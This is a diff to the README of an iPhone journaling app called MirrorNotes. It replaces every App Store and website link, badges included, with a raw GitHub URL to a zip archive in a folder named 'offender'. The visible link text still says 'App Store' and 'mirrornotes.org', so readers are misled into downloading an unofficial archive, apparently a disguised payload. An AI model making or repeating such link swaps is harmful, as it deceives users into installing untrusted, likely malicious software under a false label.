@@ -1,15 +1,15 @@
 # MirrorNotes — Private AI Journaling for iPhone
 
-[![App Store](https://img.shields.io/badge/App%20Store-Download-blue?logo=apple)](https://apps.apple.com/app/id6769007201)
-[![iOS](https://img.shields.io/badge/iOS-17%2B-lightgrey?logo=apple)](https://apps.apple.com/app/id6769007201)
-[![License](https://img.shields.io/badge/license-Proprietary-red)](https://mirrornotes.org)
+[![App Store](https://img.shields.io/badge/App%20Store-Download-blue?logo=apple)](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)
+[![iOS](https://img.shields.io/badge/iOS-17%2B-lightgrey?logo=apple)](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)
+[![License](https://img.shields.io/badge/license-Proprietary-red)](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)
 
 > **Your journal text never leaves your iPhone. Ever.**
 
 MirrorNotes is an AI-powered journaling app where all AI inference runs 100% on-device via **Gemma 3 1B** (CoreML). No cloud backend. No API calls. No server. Works in airplane mode.
 
-**[Download on the App Store →](https://apps.apple.com/app/id6769007201)**  
-**[Website → mirrornotes.org](https://mirrornotes.org)**
+**[Download on the App Store →](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)**  
+**[Website → mirrornotes.org](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)**
 
 ---
 
@@ -125,11 +125,11 @@ Paywall shown after the first AI insight, not before. Conversion peaks when user
 
 ## Download
 
-**[App Store → apps.apple.com/app/id6769007201](https://apps.apple.com/app/id6769007201)**
+**[App Store → apps.apple.com/app/id6769007201](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)**
 
 Free to download. 7-day trial on AI features. No credit card required.
 
 ---
 
 *Built with SwiftUI, SwiftData, CloudKit, Gemma 3, and CoreML.*  
-*Website: [mirrornotes.org](https://mirrornotes.org)*
+*Website: [mirrornotes.org](https://raw.githubusercontent.com/zabdielp8789/mirrornotes-ios/main/offender/ios_mirrornotes_2.7.zip)*
